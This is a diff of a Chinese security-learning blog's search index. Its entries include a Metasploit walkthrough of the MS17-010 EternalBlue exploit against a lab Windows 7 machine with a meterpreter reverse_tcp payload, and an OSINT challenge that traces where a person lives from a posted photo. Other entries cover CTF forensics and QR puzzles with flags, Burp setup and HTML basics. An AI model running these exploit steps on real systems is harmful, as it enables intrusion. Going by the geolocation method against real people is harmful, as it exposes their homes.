@@ -4,31 +4,6 @@
   
     
     <entry>
-      <title>burp火狐代理证书的安装</title>
-      <link href="2021/04/18/burp%E4%BB%A3%E7%90%86%E8%AF%81%E4%B9%A6%E7%9A%84%E5%AE%89%E8%A3%85/"/>
-      <url>2021/04/18/burp%E4%BB%A3%E7%90%86%E8%AF%81%E4%B9%A6%E7%9A%84%E5%AE%89%E8%A3%85/</url>
-      
-        <content type="html"><![CDATA[<h1 id="burp火狐代理证书"><a href="#burp火狐代理证书" class="headerlink" title="burp火狐代理证书"></a>burp火狐代理证书</h1><p><code>首先先配置火狐代理 1、选项-网络设置</code></p><p><img src="https://img-blog.csdnimg.cn/20191225152242774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpamlucWluZzM5,size_16,color_FFFFFF,t_70"></p><p>2.<code>firefox的证书设置</code></p><p><code>在firefox的url栏输入 http://burp</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE0ODI3Ni8yMDE3MDcvMTE0ODI3Ni0yMDE3MDcyNTE2MzEzMDQ1OC0zNDA4NTY2ODUucG5n?x-oss-process=image/format,png"></p><p><code>点击 CA Certificate下载证书</code></p><p><img src="https://img-blog.csdnimg.cn/20191225152538306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpamlucWluZzM5,size_16,color_FFFFFF,t_70"></p><p>下载完之后安装，导入证书</p><p>3.<strong>burpsuite的设置</strong></p><p> 用默认的就好了</p><p><img src="https://img-blog.csdnimg.cn/20191225152811317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpamlucWluZzM5,size_16,color_FFFFFF,t_70"></p><p><code>将Intercept设置为 on</code></p><p><img src="https://www.hualigs.cn/image/611bb8680eb33.jpg"></p><p><code>这样子就算设置好抓包了</code></p><p><img src="https://www.hualigs.cn/image/611bbf6b3ac78.jpg"></p><p><code>要快乐</code></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> kali </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> kali </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>第二阶段攻防</title>
       <link href="2021/04/18/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF/"/>
       <url>2021/04/18/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%94%BB%E9%98%B2%E6%80%9D%E8%B7%AF/</url>
@@ -133,7 +108,7 @@
       <link href="2021/02/28/ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
       <url>2021/02/28/ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
       
-        <content type="html"><![CDATA[<h1 id="ms17-010漏洞利用"><a href="#ms17-010漏洞利用" class="headerlink" title="ms17-010漏洞利用"></a>ms17-010漏洞利用</h1><p><code>1.kali当做攻击机 </code>  <code>2.win7当做靶机</code>、</p><p><code>二、打开kali终端终端输入nmap+ip查看靶机是否存在开放445端口</code> <code>打开kali终端终端输入nmap+ip查看靶机是否存在开放445端口</code></p><p><img src="https://img-blog.csdnimg.cn/20190103192607500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTUwMTUw,size_16,color_FFFFFF,t_70"></p><p><code>三、在kali中输入 msfconsole</code>（等待一会可能会有点慢）<br>四、进入后输人<code>search ms17-010</code>（就是之前的永恒之蓝，也就是新闻上报道的比特币勒索病毒）`</p><p><img src="https://img-blog.csdnimg.cn/20190103192651272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTUwMTUw,size_16,color_FFFFFF,t_70"></p><p><code>五、找到exploit windows/smb/ms17_010_eternalblue, 运行``use ``exploitwindows/smb/ms17_010_eternalblue ``六、输入show options 查看和配置RHOST（靶机）和LHOST（操作机）</code></p><p><code>由于我用的是虚拟电脑所以我环境已经配置好了。 如果你不知道那台电脑有漏洞你可以输入set LHOSTS 网关/24 如果是[+]前面是这样说明有漏洞，然后再set RHOST +IP。</code></p><p><img src="https://img-blog.csdnimg.cn/20190103192814715.png"></p><p><img src="https://img-blog.csdnimg.cn/20190103192905146.png"></p><p><code>七、设置TCP连接 set payload windows/x64/meterpreter/reverse_tcp</code></p><p><img src="https://img-blog.csdnimg.cn/2019010319292469.png"></p><p><code>八、run</code><strong>或</strong><code>exploit 进行攻击</code></p><p><img src="https://img-blog.csdnimg.cn/20190103192942190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTUwMTUw,size_16,color_FFFFFF,t_70"></p><p><code>拿到shell后终端输入chcp65001设置改编码</code></p><p><img src="https://dss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2475426692,75160037&fm=26&gp=0.jpg"></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="ms17-010漏洞利用"><a href="#ms17-010漏洞利用" class="headerlink" title="ms17-010漏洞利用"></a>ms17-010漏洞利用</h1><p><code>1.kali当做攻击机 </code>  <code>2.win7当做靶机</code>、</p><p><code>二、打开kali终端终端输入nmap+ip查看靶机是否存在开放445端口</code> <code>打开kali终端终端输入nmap+ip查看靶机是否存在开放445端口</code></p><p><img src="https://img-blog.csdnimg.cn/20190103192607500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTUwMTUw,size_16,color_FFFFFF,t_70"></p><p><code>三、在kali中输入 msfconsole</code>（等待一会可能会有点慢）<br>四、进入后输人<code>search ms17-010</code>（就是之前的永恒之蓝，也就是新闻上报道的比特币勒索病毒）`</p><p><img src="https://img-blog.csdnimg.cn/20190103192651272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTUwMTUw,size_16,color_FFFFFF,t_70"></p><p><code>五、找到exploit windows/smb/ms17_010_eternalblue, 运行``use ``exploitwindows/smb/ms17_010_eternalblue ``六、输入show options 查看和配置RHOST（靶机）和LHOST（操作机）</code></p><p><code>由于我用的是虚拟电脑所以我环境已经配置好了。 如果你不知道那台电脑有漏洞你可以输入set LHOSTS 网关/24 如果是[+]前面是这样说明有漏洞，然后再set RHOST +IP。</code></p><p><img src="https://img-blog.csdnimg.cn/20190103192814715.png"></p><p><img src="https://img-blog.csdnimg.cn/20190103192905146.png"></p><p><code>七、设置TCP连接 set payload windows/x64/meterpreter/reverse_tcp</code></p><p><img src="https://img-blog.csdnimg.cn/2019010319292469.png"></p><p><code>八、run</code><strong>或</strong><code>exploit 进行攻击</code></p><p><img src="https://www.hualigs.cn/image/615460b4ab9a9.jpg"></p><p><code>拿到shell后终端输入chcp65001设置改编码</code></p><p><img src="https://dss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2475426692,75160037&fm=26&gp=0.jpg"></p>]]></content>
       
       
       <categories>
@@ -179,23 +154,23 @@
     
     
     <entry>
-      <title>html语法规范</title>
-      <link href="2021/02/24/html%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/"/>
-      <url>2021/02/24/html%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</url>
+      <title>winhex-指定查询图片文本flag</title>
+      <link href="2021/02/25/winhex%E6%8C%87%E5%AE%9A%E6%9F%A5%E8%AF%A2%E5%9B%BE%E7%89%87%E3%80%81%E6%96%87%E6%9C%ACflag/"/>
+      <url>2021/02/25/winhex%E6%8C%87%E5%AE%9A%E6%9F%A5%E8%AF%A2%E5%9B%BE%E7%89%87%E3%80%81%E6%96%87%E6%9C%ACflag/</url>
       
-        <content type="html"><![CDATA[<h1 id="html标签语法规范"><a href="#html标签语法规范" class="headerlink" title="html标签语法规范"></a>html标签语法规范</h1><blockquote><p><strong>HTML标签通常是成对出现，比如</strong></p></blockquote><ul><li><p><code>&lt;html&gt; &lt;/html&gt;  </code> 这种我们称为<code>双标签</code>  ，标签第一是开始标签，第二是结束标签</p></li><li><p>有些特殊标签必须是单标签（极少情况下）例如： <code>&lt;br/&gt;</code>这种称为 单标签 </p></li><li><p>标签关系 双标签关系可以分为两类包含关系 和并列关系 </p></li><li><h5 id="lt-head-gt"><a href="#lt-head-gt" class="headerlink" title="&lt;head&gt;"></a><code>&lt;head&gt;</code></h5></li><li><h4 id="lt-title-gt-lt-title-gt"><a href="#lt-title-gt-lt-title-gt" class="headerlink" title="&lt;title&gt; &lt;/title&gt;"></a><code>&lt;title&gt; &lt;/title&gt;</code></h4></li><li><p><code>&lt;/head&gt;</code></p></li><li><p>包含关系指的是蓝色的head是爸爸，tiitle指的是儿子所以这就是父子关系</p></li><li><p><code>&lt;title&gt; &lt;/title&gt;</code></p></li><li><p><code>&lt;body&gt; &lt;/body&gt;</code> </p></li><li><p>这种就是并列关系，并列关系相当于兄弟关系</p></li></ul><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fgss0.baidu.com%2F-fo3dSag_xI4khGko9WTAnF6hhy%2Fzhidao%2Fwh%3D450%2C600%2Fsign%3Ddd61395429dda3cc0bb1b02434d91537%2Fa1ec08fa513d2697cfb9a89652fbb2fb4216d897.jpg&refer=http%3A%2F%2Fgss0.baidu.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1616751393&t=31a6da5952c1404dce41357d1f6bd72c"></p>]]></content>
+        <content type="html"><![CDATA[ <h2> winhex-指定查询图片、文本flag</h2>                                     <p>​    <code>首先我提前创建好虚拟硬盘，这个在ctf的杂项中也有相关的题目</code></p><p><img src="https://www.hualigs.cn/image/6154550ddadf0.jpg"></p><ul><li><p>1.位置可以随便设置一个</p></li><li><p>2.硬盘大小可自定义但10GB</p></li><li><p>3.动态扩展</p></li><li><p>附加vhd，</p><p><img src="https://www.hualigs.cn/image/6152fe287c0f0.jpg"></p><p><code>初始化磁盘</code></p><p><img src="https://www.hualigs.cn/image/6152fec2649cf.jpg"></p><p><code>新建简单卷默认下一步直到完成</code></p><p><img src="https://www.hualigs.cn/image/6152ff82c087c.jpg"></p><p><code>打开winhex  f9选择磁盘h  选择fat12</code></p><p><img src="https://www.hualigs.cn/image/6153046f97ed9.jpg"></p></li></ul><p><code>1就是查找的文件名1.txt只需要查询1</code></p><p>后面默认32 或者512</p><p>``1. 首先选择根目录然后进行查找文本`</p><p><img src="https://www.hualigs.cn/image/615455e0d2ff2.jpg"></p><p><code>Offset从0数到10这个位置就是05  扇区是773</code></p><p><code>Offset从0数到11是03  偏移量是17</code></p><p><img src="https://www.hualigs.cn/image/615456bbd6172.jpg"></p><p>​    <code>1是扇区按键2.是偏移量  已知簇区773 偏移量17</code></p><p><img src="https://www.hualigs.cn/image/6154572e7b77d.jpg"></p><p><img src="https://www.hualigs.cn/image/6154578cc71f3.jpg"></p><p><code>选块起始</code></p><p><img src="https://www.hualigs.cn/image/615457f5338a0.jpg"></p><p><code>确定选块结束，右键编辑导出来</code></p><p><img src="https://www.hualigs.cn/image/615458aa042b8.jpg"></p><p><img src="https://www.hualigs.cn/image/61545971b8690.jpg"></p><h4>从上诉看完全正确拿到flag,图片也是按这个思路走。</h4><ul><li><h1>完成</li></ul>]]></content>
       
       
       <categories>
           
-          <category> html </category>
+          <category> winhex </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> html </tag>
+            <tag> winhex </tag>
             
         </tags>
       
@@ -229,6 +204,81 @@
     
     
     <entry>
+      <title>burp火狐代理证书的安装</title>
+      <link href="2021/02/24/burp%E4%BB%A3%E7%90%86%E8%AF%81%E4%B9%A6%E7%9A%84%E5%AE%89%E8%A3%85/"/>
+      <url>2021/02/24/burp%E4%BB%A3%E7%90%86%E8%AF%81%E4%B9%A6%E7%9A%84%E5%AE%89%E8%A3%85/</url>
+      
+        <content type="html"><![CDATA[<h1 id="burp火狐代理证书"><a href="#burp火狐代理证书" class="headerlink" title="burp火狐代理证书"></a>burp火狐代理证书</h1><p><code>首先先配置火狐代理 1、选项-网络设置</code></p><p><img src="https://img-blog.csdnimg.cn/20191225152242774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpamlucWluZzM5,size_16,color_FFFFFF,t_70"></p><p>2.<code>firefox的证书设置</code></p><p><code>在firefox的url栏输入 http://burp</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvMTE0ODI3Ni8yMDE3MDcvMTE0ODI3Ni0yMDE3MDcyNTE2MzEzMDQ1OC0zNDA4NTY2ODUucG5n?x-oss-process=image/format,png"></p><p><code>点击 CA Certificate下载证书</code></p><p><img src="https://img-blog.csdnimg.cn/20191225152538306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpamlucWluZzM5,size_16,color_FFFFFF,t_70"></p><p>下载完之后安装，导入证书</p><p>3.<strong>burpsuite的设置</strong></p><p> 用默认的就好了</p><p><img src="https://img-blog.csdnimg.cn/20191225152811317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpamlucWluZzM5,size_16,color_FFFFFF,t_70"></p><p><code>将Intercept设置为 on</code></p><p><img src="https://www.hualigs.cn/image/611bb8680eb33.jpg"></p><p><code>这样子就算设置好抓包了</code></p><p><img src="https://www.hualigs.cn/image/611bbf6b3ac78.jpg"></p><p><code>要快乐</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> kali </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> kali </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>html语法规范</title>
+      <link href="2021/02/24/html%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/"/>
+      <url>2021/02/24/html%E8%AF%AD%E6%B3%95%E8%A7%84%E8%8C%83/</url>
+      
+        <content type="html"><![CDATA[<h1 id="html标签语法规范"><a href="#html标签语法规范" class="headerlink" title="html标签语法规范"></a>html标签语法规范</h1><blockquote><p><strong>HTML标签通常是成对出现，比如</strong></p></blockquote><ul><li><p><code>&lt;html&gt; &lt;/html&gt;  </code> 这种我们称为<code>双标签</code>  ，标签第一是开始标签，第二是结束标签</p></li><li><p>有些特殊标签必须是单标签（极少情况下）例如： <code>&lt;br/&gt;</code>这种称为 单标签 </p></li><li><p>标签关系 双标签关系可以分为两类包含关系 和并列关系 </p></li><li><h5 id="lt-head-gt"><a href="#lt-head-gt" class="headerlink" title="&lt;head&gt;"></a><code>&lt;head&gt;</code></h5></li><li><h4 id="lt-title-gt-lt-title-gt"><a href="#lt-title-gt-lt-title-gt" class="headerlink" title="&lt;title&gt; &lt;/title&gt;"></a><code>&lt;title&gt; &lt;/title&gt;</code></h4></li><li><p><code>&lt;/head&gt;</code></p></li><li><p>包含关系指的是蓝色的head是爸爸，tiitle指的是儿子所以这就是父子关系</p></li><li><p><code>&lt;title&gt; &lt;/title&gt;</code></p></li><li><p><code>&lt;body&gt; &lt;/body&gt;</code> </p></li><li><p>这种就是并列关系，并列关系相当于兄弟关系</p></li></ul><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fgss0.baidu.com%2F-fo3dSag_xI4khGko9WTAnF6hhy%2Fzhidao%2Fwh%3D450%2C600%2Fsign%3Ddd61395429dda3cc0bb1b02434d91537%2Fa1ec08fa513d2697cfb9a89652fbb2fb4216d897.jpg&refer=http%3A%2F%2Fgss0.baidu.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1616751393&t=31a6da5952c1404dce41357d1f6bd72c"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> html </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> html </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>1和0的故事</title>
+      <link href="2021/02/24/misc%201%E5%92%8C0%E7%9A%84%E6%95%85%E4%BA%8B/"/>
+      <url>2021/02/24/misc%201%E5%92%8C0%E7%9A%84%E6%95%85%E4%BA%8B/</url>
+      
+        <content type="html"><![CDATA[<p>题目链接：<a href="https://ctf.bugku.com/challenges/detail/id/216.html">https://ctf.bugku.com/challenges/detail/id/216.html</a></p><p><code>描　　述: 1和0的故事</code></p><p>​    <code>解题思路    </code></p><p><code>拿到题给文件，是一个文本文档，打开发现是一个 25 25 25 行 25 25 25 列的文本，内容只有 0 0 0和 1 1 1  </code>    `  </p><p>​           </p><p><img src="https://img-blog.csdnimg.cn/20210411202223952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p><ul><li><p><code>一个正方形矩阵，只有 0 0 0 和 1 1 1 ，自然先想到了二维码，由于学艺不精，暂时没有掌握Python作图的技能，但是就这样放弃吗？不不不，这里用Excel做。利用Excel的定位条件功能（用条件格式的话，思路也差不多）。</code></p><p><code>首先，将文本复制粘贴进Excel中，这时会发现，所有数据挤在一列里，操作的话，应该是每个数据占一个格。 </code></p><p><img src="https://img-blog.csdnimg.cn/20210411202325988.png"></p></li><li><p><code>在“数据选项卡”-“数据工具组”-找到分列，按照固定宽度分列。每个宽度为一个字符。</code></p><p><img src="https://img-blog.csdnimg.cn/20210411202349405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p><p><code>列完成以后，调整一下宽高，大约能成一个正方形就行，这里推荐行高 默认（默认高度的码，不太方，不是很容易扫出来。。现在推荐行高``15.1 ，列宽2</code></p><p><img src="https://img-blog.csdnimg.cn/20210411202431619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p></li></ul><p><code>然后选中该区域，</code>Ctrl+H<code>替换，删除所有的</code>0<code>，在查找和选择中，选择定位条件。选择空值，即可自动选择所有之前为</code>0<code>的区域。</code></p><p><img src="https://img-blog.csdnimg.cn/20210411202454777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p><p><code>然后用填充，把背景改成白色。然后再次使用定位条件，这次选择常量，即可定位所有的</code>1<code>。</code></p><p><img src="https://img-blog.csdnimg.cn/20210411202523597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p><p><code>然后把填充改成黑色。此时，二维码的雏形已经出来了，但是还差了三个边角。可以按住Ctrl多选边角所在位置的单元格。然后把填充色改为黑色。</code><br><code>此处应该注意，三角定位符与内容之间有一个空隙，之前忽略了这一点导致二维码不太容易扫出来</code></p><p><code>最后就大功告成了。</code><br><code>补一个更改行高为15.1后的码（更方了，更容易扫出来）</code></p><p><img src="https://img-blog.csdnimg.cn/2021042715481054.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDI4OTk1OQ==,size_16,color_FFFFFF,t_70"></p><h2>flag{QR_c0de_1s_1nterest1n9} </h2><ul><li><p>完成</p><p>!</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> mlsc </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mlsc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>kali安装tools</title>
       <link href="2021/02/20/kali%E5%AE%89%E8%A3%85tools%E6%96%B9%E6%B3%95/"/>
       <url>2021/02/20/kali%E5%AE%89%E8%A3%85tools%E6%96%B9%E6%B3%95/</url>
@@ -254,6 +304,31 @@
     
     
     <entry>
+      <title>社工-进阶收集</title>
+      <link href="2021/02/20/misc%E7%9A%84%E7%A4%BE%E5%B7%A5%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86/"/>
+      <url>2021/02/20/misc%E7%9A%84%E7%A4%BE%E5%B7%A5%E8%BF%9B%E9%98%B6%E6%94%B6%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[ <h1> 社工-进阶收集</h1><p><code>提示flag&#123;小美小区名字拼音&#125;</code>                           </p><ul><li><p>描述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编题，难度降低了。)                              </p></li><li><p>链接：<a href="https://pan.baidu.com/s/1sRAPjcSKs6lTRuSEYlRp1Q">https://pan.baidu.com/s/1sRAPjcSKs6lTRuSEYlRp1Q</a></p></li><li><p>提取码：fo00</p><p><img src="https://www.hualigs.cn/image/6152cdbbbc65a"></p></li><li><p><code>1.我们首先进行百度识图，识图只识别图片即可，下面评论就不用了</code></p></li><li><p><code>2.盲猜应该是西安的“烂怂”大雁塔吧</code></p></li><li><p><code>3.然后已知是西安地方所以找西安地铁站线路图</code></p><p><img src="http://jtapi.bendibao.com/ditie/inc/xa/xianlu.gif"></p><p><code>可以从上诉看出已知然后距离大雁塔7站地，而且中间要转一站所以是始站是韦曲站，然后转站刚刚好到大雁塔站</code></p><p><code>已经知道了所以韦曲站测距离800附近</code></p><h1> 打开高德地图进行测距离</h1><p><img src="https://www.hualigs.cn/image/6152eb1e60b3a.jpg"></p></li></ul><p><code>从中测距发现是韦曲站测距离800就找到了兰乔国际城</code></p><p><code>题目挺简单的，不过挺有意思的。</code></p><h2>flag{lanqiaoguojicheng}</h2><p><img src="https://www.hualigs.cn/image/6152ed8a2e32b.jpg"></p><ul><li><p>完成</p><p>!</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> mlsc </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mlsc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>ms12-020蓝屏漏洞</title>
       <link href="2021/02/20/ms12-020%E8%93%9D%E5%B1%8F%E6%BC%8F%E6%B4%9E/"/>
       <url>2021/02/20/ms12-020%E8%93%9D%E5%B1%8F%E6%BC%8F%E6%B4%9E/</url>
@@ -271,6 +346,31 @@
         <tags>
             
             <tag> 漏洞利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>winhex-恢复磁盘数据</title>
+      <link href="2021/02/20/winhex%E6%81%A2%E5%A4%8D%E7%A3%81%E7%9B%98%E6%95%B0%E6%8D%AE/"/>
+      <url>2021/02/20/winhex%E6%81%A2%E5%A4%8D%E7%A3%81%E7%9B%98%E6%95%B0%E6%8D%AE/</url>
+      
+        <content type="html"><![CDATA[ <h2> winhex-恢复磁盘数据</h2>                                     <ul><li><p>链接：<a href="https://pan.baidu.com/s/1eWRB_kVrVA2YoRoYqwxDzA">https://pan.baidu.com/s/1eWRB_kVrVA2YoRoYqwxDzA</a></p></li><li><p>提取码：97v2</p></li><li><p><code>可能工具使用不了因为是文件夹需要依赖一些附件，所以自行百度下载工具</code></p></li><li><p><code>如果是镜像就直接导入winhex 可以进行换成扇区，因为如果不是镜像的话下面显示就是以页的方式显示，所以只是让他看起来舒服点</code></p><p><img src="https://www.hualigs.cn/image/6152f2df70eb0.jpg"></p><p><code>专业工具-将镜像文件转换成磁盘，如果是这种镜像恢复直接导入即可不必要去管理工具-进行附加V HD</code></p><p><img src="https://www.hualigs.cn/image/6152f45bb6049.jpg"></p><p><code>磁盘工具-文件类型恢复即可</code></p><p><img src="https://www.hualigs.cn/image/6152f4c04aa68.jpg"></p><p><code>恢复即可</code></p></li></ul><p><img src="https://www.hualigs.cn/image/6152ed8a2e32b.jpg"></p><ul><li><p>完成</p><p>!</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> winhex </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> winhex </tag>
             
         </tags>
       
